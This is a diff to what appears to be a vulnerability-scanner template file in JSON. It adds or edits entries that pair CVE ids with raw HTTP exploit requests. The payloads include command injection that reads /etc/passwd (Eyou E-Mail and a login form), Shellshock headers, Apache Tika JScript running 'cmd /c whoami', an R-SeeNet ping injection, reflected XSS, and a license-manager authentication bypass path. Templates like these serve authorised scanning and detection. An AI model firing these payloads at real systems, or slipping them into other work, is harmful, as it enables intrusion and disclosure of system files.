@@ -2970,6 +2970,20 @@
       ]
     },
     {
+      "id": "CVE-2014-1203",
+      "info": {
+        "name": "Eyou E-Mail <3.6 - Remote Code Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\ntype='|cat /etc/passwd||'\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2014-2321",
       "info": {
         "name": "ZTE Cable Modem Web Shell",
@@ -3340,9 +3354,9 @@
       "requests": [
         {
           "headers": {
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -4575,7 +4589,7 @@
     {
       "id": "CVE-2016-10367",
       "info": {
-        "name": "Opsview Monitor Pro - Unauthenticated Directory Traversal",
+        "name": "Opsview Monitor Pro - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -6448,11 +6462,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2",
-            "Connection": "close"
+            "Content-type": "image/jp2"
           },
           "method": "PUT",
           "path": [
@@ -8189,7 +8203,7 @@
     {
       "id": "CVE-2019-10717",
       "info": {
-        "name": "BlogEngine.NET 3.3.7.0 - Directory Traversal",
+        "name": "BlogEngine.NET 3.3.7.0 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -10161,7 +10175,7 @@
     {
       "id": "CVE-2020-10770",
       "info": {
-        "name": "Keycloak 12.0.1 - 'request_uri ' Blind Server-Side Request Forgery (SSRF) (Unauthenticated)",
+        "name": "Keycloak 12.0.1 - request_uri  Blind Server-Side Request Forgery (SSRF)",
         "severity": "medium"
       },
       "requests": [
@@ -11258,8 +11272,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Referer": "{{Hostname}}/module/login/login.html"
+            "Referer": "{{Hostname}}/module/login/login.html",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -13656,6 +13670,36 @@
       ]
     },
     {
+      "id": "CVE-2021-21799",
+      "info": {
+        "name": "Advantech R-SeeNet v 2.4.12 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/php/telnet_form.php?hostname=%3C%2Ftitle%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Ctitle%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-21800",
+      "info": {
+        "name": "Advantech R-SeeNet v 2.4.12 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/php/ssh_form.php?hostname=%3C/title%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Ctitle%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-21801",
       "info": {
         "name": "Advantech R-SeeNet graph parameter - Reflected Cross-Site Scripting (XSS)",
@@ -13696,6 +13740,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/php/device_graph_page.php?is2sim=%22zlo%20onerror=alert(1)%20%22"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-21805",
+      "info": {
+        "name": "Advantech R-SeeNet v 2.4.12 - OS Command Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/php/ping.php?hostname=|dir"
           ]
         }
       ]
@@ -17572,6 +17631,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/RestAPI/ImportTechnicians"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "unauth-rlm",
+      "info": {
+        "name": "Reprise License Manager 14.2 - Authentication Bypass",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/goforms/menu"
           ]
         }
       ]
